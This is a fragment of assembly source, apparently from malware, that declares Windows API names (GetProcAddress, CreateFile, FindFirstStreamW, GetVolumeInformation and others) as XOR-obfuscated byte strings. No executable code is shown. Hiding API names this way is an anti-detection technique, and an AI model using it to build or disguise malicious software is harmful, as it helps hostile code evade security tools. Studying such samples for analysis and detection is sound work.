...
FILE_WRITE_ATTRIBUTES equ 0x100
...
get_proc_address_xor: db 0x77, 0x55, 0x44, 0x60, 0x42, 0x5f, 0x53, 0x71, 0x54, 0x54, 0x42, 0x55, 0x43, 0x43, 0
.len equ $ - get_proc_address_xor - 1
...
get_volume_information_a_xor: db 0x77, 0x55, 0x44, 0x66, 0x5f, 0x5c, 0x45, 0x5d, 0x55, 0x79, 0x5e, 0x56, 0x5f, 0x42, 0x5d, 0x51, 0x44, 0x59, 0x5f, 0x5e, 0x71, 0
.len equ $ - get_volume_information_a_xor - 1

get_volume_information_w_xor: db 0x77, 0x55, 0x44, 0x66, 0x5f, 0x5c, 0x45, 0x5d, 0x55, 0x79, 0x5e, 0x56, 0x5f, 0x42, 0x5d, 0x51, 0x44, 0x59, 0x5f, 0x5e, 0x67, 0
.len equ $ - get_volume_information_w_xor - 1
...
open_file_xor: db 0x7f, 0x40, 0x55, 0x5e, 0x76, 0x59, 0x5c, 0x55, 0
.len equ $ - open_file_xor - 1 

get_file_size_xor: db 0x77, 0x55, 0x44, 0x76, 0x59, 0x5c, 0x55, 0x63, 0x59, 0x4a, 0x55, 0 
.len equ $ - get_file_size_xor - 1

create_file_a_xor: db 0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x76, 0x59, 0x5c, 0x55, 0x71, 0
.len equ $ - create_file_a_xor - 1

create_file_w_xor: db 0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x76, 0x59, 0x5c, 0x55, 0x67, 0
.len equ $ - create_file_w_xor - 1

read_file_xor: db 0x62, 0x55, 0x51, 0x54, 0x76, 0x59, 0x5c, 0x55, 0 
.len equ $ - read_file_xor - 1

set_file_pointer_xor: db 0x63, 0x55, 0x44, 0x76, 0x59, 0x5c, 0x55, 0x60, 0x5f, 0x59, 0x5e, 0x44, 0x55, 0x42, 0
.len equ $ - set_file_pointer_xor - 1

find_first_stream_w_xor: db 0x76, 0x59, 0x5e, 0x54, 0x76, 0x59, 0x42, 0x43, 0x44, 0x63, 0x44, 0x42, 0x55, 0x51, 0x5d, 0x67, 0  
.len equ $ - find_first_stream_w_xor - 1

find_next_stream_w_xor: db 0x76, 0x59, 0x5e, 0x54, 0x7e, 0x55, 0x48, 0x44, 0x63, 0x44, 0x42, 0x55, 0x51, 0x5d, 0x67, 0
.len equ $ - find_next_stream_w_xor - 1

find_close_xor: db 0x76, 0x59, 0x5e, 0x54, 0x73, 0x5c, 0x5f, 0x43, 0x55, 0 
.len equ $ - find_close_xor - 1
...
virtual_free_xor: db 0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x76, 0x42, 0x55, 0x55, 0
.len equ $ - virtual_free_xor - 1
